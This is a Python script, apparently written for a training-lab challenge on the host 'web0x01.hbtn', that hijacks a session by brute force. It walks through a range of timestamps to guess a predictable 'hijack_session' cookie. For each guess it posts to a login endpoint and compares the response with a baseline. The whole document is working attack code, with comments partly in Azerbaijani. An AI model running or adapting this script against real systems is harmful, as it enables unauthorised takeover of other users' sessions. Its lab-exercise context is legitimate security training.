import requests
import json

# Filled based on: a9215a54-bc22-4cf5-b61-4810407-17693468037
prefix = "a9215a54-bc22-4cf5-b61"
session_id = "4810407"
target_url = "http://web0x01.hbtn/api/a1/hijack_session/login"

# Scanning back 3000 units from your current time (17693468037)
start_timestamp = 17693465037
end_timestamp = 17693468050

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "application/json",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/json",
    "Connection": "keep-alive"
}

# Sənin session cookie-n
# COPY THIS FROM YOUR BROWSER (Application -> Cookies -> session)
your_session = "INSERT_YOUR_VALID_SESSION_COOKIE_HERE"

# Login data (boş və ya random)
login_data = json.dumps({"email": "test@test.com", "password": "test"})

# Baseline
baseline_cookies = {
    "hijack_session": f"{prefix}-9999999-0000000000",
    "session":  your_session
}
baseline = requests.post(target_url, data=login_data, cookies=baseline_cookies, headers=headers, timeout=10)
baseline_len = len(baseline.text)
print(f"[*] Baseline response:  {baseline.text[:200]}")
print(f"[*] Baseline length: {baseline_len}")
print(f"[*] Araliq: {start_timestamp} - {end_timestamp}\n")

for ts in range(start_timestamp, end_timestamp + 1):
    cookie_value = f"{prefix}-{session_id}-{ts}"
    
    cookies = {
        "hijack_session": cookie_value,
        "session": your_session
    }
    
    r = requests.post(target_url, data=login_data, cookies=cookies, headers=headers, timeout=10)
    
    # Fərqli cavab və ya "success" varsa
    if len(r.text) != baseline_len or "success" in r.text.lower():
        print(f"\n[+] TAPILDI!")
        print(f"[+] Timestamp: {ts}")
        print(f"[+] Cookie: {cookie_value}")
        print(f"[+] Response: {r.text}")
        break
    
    print(f"[*] {ts}", end='\r')
else:
    print("\n[-] Tapilmadi")
